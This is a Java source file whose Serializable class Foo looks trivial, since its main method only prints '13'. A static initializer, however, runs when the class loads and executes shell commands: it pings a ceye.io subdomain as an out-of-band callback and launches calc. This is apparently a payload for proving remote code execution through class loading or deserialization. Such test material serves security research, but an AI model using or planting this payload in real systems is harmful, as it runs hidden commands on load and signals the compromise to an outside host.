import java.io.IOException;
import java.io.Serializable;

public class Foo implements Serializable {
    static {
        try {
            Runtime.getRuntime().exec("ping -nc 4 test.v3njn9.ceye.io");
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        System.out.println("13");
    }
}
